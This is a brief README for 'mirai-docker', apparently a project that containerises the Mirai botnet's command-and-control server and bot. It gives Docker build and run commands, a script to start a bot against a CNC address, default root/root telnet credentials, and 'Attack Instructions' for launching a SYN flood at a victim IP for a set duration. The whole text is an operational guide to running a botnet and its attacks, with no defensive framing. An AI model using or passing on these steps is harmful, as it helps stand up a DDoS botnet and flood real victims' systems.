# mirai-docker

## CNC
Build: `$ sudo docker build -t cnc .`\n
Run: `$ sudo docker run -i -t cnc`\n

## BOT
Build: `$ sudo docker build -t bot .`\n
Run: `$ sudo docker run -i -t bot`\n
Start Bot: `$ init.sh "IP of CNC" `\n

## Attack Instructions
Connect to CNC: `$ telnet "IP of CNC"`\n
username: root\n
password: root\n
attack: `$ syn "IP of Victim" "duration of attack"`\n
